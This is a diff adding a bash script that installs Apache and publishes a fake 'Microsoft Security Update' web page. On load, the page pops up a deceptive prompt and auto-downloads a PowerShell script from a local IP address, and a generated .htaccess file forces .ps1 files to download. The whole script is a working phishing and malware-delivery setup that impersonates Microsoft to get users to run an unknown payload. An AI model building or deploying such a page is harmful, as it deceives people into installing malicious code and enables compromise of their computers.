@@ -1,0 +1,150 @@
+#!/bin/bash
+
+# Variables
+SCRIPT_URL="http://192.168.50.53/powershellscript.ps1"
+DOCUMENT_ROOT="/var/www/html"
+HTML_FILE="$DOCUMENT_ROOT/index.html"
+HTACCESS_FILE="$DOCUMENT_ROOT/.htaccess"
+
+sudo apt install -y apache2
+  
+# Function to check if a command was successful
+check_success() {
+    if [[ $? -ne 0 ]]; then
+        echo "$1 failed!"
+        exit 1
+    else
+        echo "$1 succeeded."
+    fi
+}
+
+# Check if running as root
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root" 
+    exit 1
+fi
+
+# Install Apache if not already installed
+if ! command -v apache2 &> /dev/null; then
+    echo "Apache2 is not installed. Installing..."
+    apt update
+    apt install -y apache2
+    check_success "Apache2 installation"
+else
+    echo "Apache2 is already installed."
+fi
+
+# Create the HTML file with Microsoft security update content
+cat <<EOF > $HTML_FILE
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Security Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f3f4f6;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        h1 {
+            color: #0078d7;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .button {
+            background-color: #0078d7;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #0056a1;
+        }
+    </style>
+    <script>
+        function showDownloadPopup() {
+            if (confirm("Microsoft Security Update\\n\\nTo protect your computer from potential viruses, we recommend downloading and running this security update. Do you want to proceed?")) {
+                const link = document.createElement('a');
+                link.href = "$SCRIPT_URL"; // URL to your script
+                link.download = "powershellscript.ps1"; // Suggested filename
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+    </script>
+</head>
+<body onload="showDownloadPopup()">
+    <div class="container">
+        <h1>Microsoft Security Update</h1>
+        <p>Dear User,</p>
+        <p>We have detected potential security threats on your system. To ensure your computer's safety, please download and run the Microsoft Security Update provided below. This update is critical for maintaining the integrity of your system and protecting against malware.</p>
+        <p>Your prompt action is necessary to prevent any disruptions in your service.</p>
+        <a href="#" class="button" onclick="showDownloadPopup()">Download Security Update</a>
+        <p>If you encounter any issues, please contact Microsoft Support for assistance.</p>
+    </div>
+</body>
+</html>
+EOF
+
+check_success "HTML file creation"
+
+# Create the .htaccess file
+cat <<EOF > $HTACCESS_FILE
+# Enable the use of headers in .htaccess
+<IfModule mod_headers.c>
+    # Set the MIME type for .ps1 files to text/plain
+    AddType text/plain .ps1
+
+    # Force download for .ps1 files
+    <FilesMatch "\.ps1$">
+        Header set Content-Disposition "attachment"
+    </FilesMatch>
+</IfModule>
+EOF
+
+check_success ".htaccess file creation"
+
+# Set permissions
+chown -R www-data:www-data $DOCUMENT_ROOT
+chmod -R 755 $DOCUMENT_ROOT
+
+# Restart Apache
+systemctl restart apache2
+check_success "Apache restart"
+
+# Check if the server is running
+if systemctl is-active --quiet apache2; then
+    echo "Apache is running."
+else
+    echo "Apache is not running!"
+    exit 1
+fi
+
+# Check if HTML file is accessible
+if curl -s --head --request GET http://192.168.50.53/index.html | grep "200 OK" > /dev/null; then
+    echo "Website is accessible at http://192.168.50.53/index.html"
+else
+    echo "Website is not accessible."
+    exit 1
+fi
+
+echo "Website setup completed successfully."
